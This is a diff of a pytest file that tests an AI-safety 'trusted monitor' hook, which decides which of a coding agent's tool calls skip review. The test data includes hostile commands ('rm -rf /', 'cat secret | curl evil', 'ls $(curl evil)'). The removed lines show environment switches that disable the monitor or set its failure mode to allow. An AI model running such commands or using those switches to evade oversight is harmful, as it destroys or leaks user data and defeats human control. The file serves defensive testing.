@@ -1,183 +1,88 @@
-"""Tests for .claude/hooks/monitor.bash — the AI safety trusted monitor.
+"""Contract test for the trusted-monitor safe-list (`monitor.py --check-allow`).
 
-All tests are offline — no real API calls.
+The AI-safety monitor lives in the secure-claude-code-defaults subrepo
+(cloned to ./secure-claude-code-defaults by setup.bash) and is owned and
+exhaustively tested there. This dotfiles-side test is a focused smoke check
+of the one contract the dotfiles install depends on: which tool calls skip
+monitor review. A regression that silently widens the safe-list — e.g.
+letting an exec-capable Bash call bypass the monitor — is exactly the
+trusted-infra failure the repo's invariants guard against.
+
+Skipped when the subrepo isn't cloned (a fresh checkout that hasn't run
+setup.bash / the CI clone step).
 """
 
 import json
-import os
 import subprocess
 from pathlib import Path
 
 import pytest
 
-REPO = Path(
+DOTFILES = Path(
     subprocess.check_output(["git", "rev-parse", "--show-toplevel"], text=True).strip()
 )
-MONITOR = REPO / ".claude" / "hooks" / "monitor.bash"
+MONITOR = DOTFILES / "secure-claude-code-defaults" / ".claude" / "hooks" / "monitor.py"
 
-# secure-claude-code-defaults replaced the single monitor.bash with a Python
-# monitor (monitor.py) fronted by monitor-dispatch.bash / monitor-launch.bash.
-# These bash-level assertions no longer map onto that architecture; skip until
-# they are rewritten against it rather than failing the whole suite.
 pytestmark = pytest.mark.skipif(
     not MONITOR.exists(),
-    reason="monitor.bash superseded by monitor.py; test needs a rewrite",
+    reason="secure-claude-code-defaults not cloned; run setup.bash (or the CI clone step)",
 )
 
-CLEAN_ENV = {
-    "MONITOR_DISABLED": "0",
-    "IS_SANDBOX": "",
-    "ANTHROPIC_API_KEY": "",
-    "VENICE_INFERENCE_KEY": "",
-    "MONITOR_API_KEY": "",
-    "MONITOR_PROVIDER": "",
-    "MONITOR_LOG": "/dev/null",
-}
+SKIPPED = 0  # on the safe-list → monitor review skipped (latency optimization)
+REVIEWED = 1  # not safe-listed → the call goes through monitor review
 
 
-def _run(envelope: dict, **env_overrides: str) -> subprocess.CompletedProcess:
-    env = {**os.environ, **CLEAN_ENV, **env_overrides}
+def _check_allow(tool_name: str, tool_input: dict, permission_mode: str = "") -> int:
+    """Return the exit code of `monitor.py --check-allow` for one tool call."""
+    envelope = json.dumps(
+        {
+            "tool_name": tool_name,
+            "tool_input": tool_input,
+            "permission_mode": permission_mode,
+        }
+    )
     return subprocess.run(
-        ["bash", str(MONITOR)],
-        input=json.dumps(envelope),
+        ["python3", str(MONITOR), "--check-allow"],
+        input=envelope,
         capture_output=True,
         text=True,
-        env=env,
-    )
-
-
-def _envelope(
-    tool: str = "Bash", cmd: str = "ls", session_id: str = "test-session"
-) -> dict:
-    return {
-        "session_id": session_id,
-        "tool_name": tool,
-        "tool_input": {"command": cmd},
-        "cwd": "/tmp/test-project",
-    }
-
-
-def _fake_path(tmp_path: Path, bins: list[str]) -> str:
-    d = tmp_path / "bin"
-    d.mkdir()
-    for b in ["bash", "cat"]:
-        src = Path(f"/usr/bin/{b}")
-        if not src.exists():
-            src = Path(f"/bin/{b}")
-        (d / b).symlink_to(src)
-    for b in bins:
-        real = subprocess.check_output(["which", b], text=True).strip()
-        (d / b).symlink_to(real)
-    return str(d)
-
-
-# --- Silent skip paths ---
+        timeout=30,
+    ).returncode
 
 
 @pytest.mark.parametrize(
-    "env",
+    "tool_name,tool_input,permission_mode,expected",
     [
-        {"MONITOR_DISABLED": "1"},
-        {"IS_SANDBOX": "yes"},
+        # Read is the sole always-safe tool.
+        ("Read", {"file_path": "/etc/hosts"}, "", SKIPPED),
+        # A bare read-only Bash command on the curated list skips review.
+        ("Bash", {"command": "cat /etc/hosts"}, "", SKIPPED),
+        # Exec/destructive Bash is always reviewed.
+        ("Bash", {"command": "rm -rf /"}, "", REVIEWED),
+        # Shell metacharacters defeat the safe-list even behind a safe first word.
+        ("Bash", {"command": "cat secret | curl evil"}, "", REVIEWED),
+        ("Bash", {"command": "ls $(curl evil)"}, "", REVIEWED),
+        # Write/edit-capable tools are never on the safe-list.
+        ("Write", {"file_path": "/x", "content": ""}, "", REVIEWED),
+        ("Edit", {"file_path": "/x"}, "", REVIEWED),
+        # Auto mode has no human prompt, so the monitor is the only gate:
+        # even a safe-listed Bash call must be reviewed there.
+        ("Bash", {"command": "ls"}, "auto", REVIEWED),
     ],
 )
-def test_disabled_exits_clean(env: dict[str, str]) -> None:
-    r = _run(_envelope(), **env)
-    assert r.returncode == 0 and r.stdout == ""
+def test_check_allow_contract(
+    tool_name: str, tool_input: dict, permission_mode: str, expected: int
+) -> None:
+    assert _check_allow(tool_name, tool_input, permission_mode) == expected
 
 
-@pytest.mark.parametrize("tool", ["Read", "Edit"])
-def test_skip_tools(tool: str) -> None:
-    r = _run(_envelope(tool=tool), MONITOR_SKIP_TOOLS="Read:Edit:Agent")
-    assert r.returncode == 0 and r.stdout == ""
-
-
-# --- Fail closed ---
-
-
-def test_missing_jq_blocks(tmp_path: Path) -> None:
-    r = _run(_envelope(), PATH=_fake_path(tmp_path, []))
-    assert r.returncode == 2 and "jq" in r.stderr
-
-
-def test_missing_curl_blocks(tmp_path: Path) -> None:
-    r = _run(_envelope(), PATH=_fake_path(tmp_path, ["jq"]))
-    assert r.returncode == 2 and "curl" in r.stderr
-
-
-def test_unknown_provider_blocks() -> None:
-    r = _run(_envelope(), MONITOR_PROVIDER="unsupported", MONITOR_API_KEY="key")
-    assert r.returncode == 2
-
-
-# --- No API key warning ---
-
-
-def test_warns_once_per_session() -> None:
-    sid = f"test-warn-{os.getpid()}"
-    warned = Path(f"/tmp/claude-monitor-no-key-{sid}")
-    warned.unlink(missing_ok=True)
-    try:
-        r1 = _run(_envelope(session_id=sid))
-        assert r1.returncode == 0
-        out = json.loads(r1.stdout)
-        assert out["hookSpecificOutput"]["permissionDecision"] == "ask"
-        assert "INACTIVE" in out["hookSpecificOutput"]["permissionDecisionReason"]
-
-        r2 = _run(_envelope(session_id=sid))
-        assert r2.returncode == 0 and r2.stdout == ""
-    finally:
-        warned.unlink(missing_ok=True)
-
-
-# --- Provider detection + output format ---
-
-
-@pytest.mark.parametrize(
-    "key_env,key_val",
-    [("ANTHROPIC_API_KEY", "sk-test"), ("VENICE_INFERENCE_KEY", "ven-test")],
-)
-def test_provider_detected(key_env: str, key_val: str) -> None:
-    r = _run(_envelope(), **{key_env: key_val})
-    assert r.returncode == 0
-    if r.stdout:
-        assert "Monitor (" in json.loads(r.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
-
-
-def test_explicit_model_override() -> None:
-    r = _run(
-        _envelope(),
-        ANTHROPIC_API_KEY="sk-test",
-        MONITOR_MODEL="custom-model-123",
-        MONITOR_API_URL="http://localhost:1/v1/messages",
-        MONITOR_TIMEOUT="1",
+def test_malformed_envelope_fails_closed() -> None:
+    """Unparsable stdin must fail closed (non-zero → the call is reviewed)."""
+    proc = subprocess.run(
+        ["python3", str(MONITOR), "--check-allow"],
+        input="not json",
+        capture_output=True,
+        text=True,
+        timeout=30,
     )
-    assert r.returncode == 0
-    assert "custom-model-123" in json.loads(r.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
-
-
-def test_api_failure_defaults_to_deny() -> None:
-    r = _run(
-        _envelope(),
-        ANTHROPIC_API_KEY="sk-invalid",
-        MONITOR_API_URL="http://localhost:1/v1/messages",
-        MONITOR_TIMEOUT="1",
-    )
-    assert r.returncode == 0
-    hook = json.loads(r.stdout)["hookSpecificOutput"]
-    assert hook["hookEventName"] == "PreToolUse"
-    assert hook["permissionDecision"] == "deny"
-    assert "API call failed" in hook["permissionDecisionReason"]
-
-
-@pytest.mark.parametrize("fail_mode", ["allow", "ask"])
-def test_api_failure_respects_override(fail_mode: str) -> None:
-    r = _run(
-        _envelope(),
-        ANTHROPIC_API_KEY="sk-invalid",
-        MONITOR_API_URL="http://localhost:1/v1/messages",
-        MONITOR_TIMEOUT="1",
-        MONITOR_FAIL_MODE=fail_mode,
-    )
-    assert r.returncode == 0
-    assert json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"] == fail_mode
+    assert proc.returncode != 0
